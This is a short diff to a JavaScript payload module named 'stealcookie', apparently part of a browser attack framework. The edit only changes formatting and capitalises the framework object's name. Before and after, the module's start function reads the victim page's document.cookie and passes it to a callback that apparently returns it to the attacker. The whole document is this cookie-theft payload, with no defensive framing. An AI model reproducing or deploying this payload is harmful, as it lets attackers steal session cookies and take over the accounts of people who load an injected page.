@@ -1,4 +1,4 @@
-this.name = 'stealcookie';
-this.start = function() {
-  dviide.callbackText(document.cookie);
+this.name = 'stealcookie'
+this.start = function () {
+  Dviide.callbackText(document.cookie)
 }
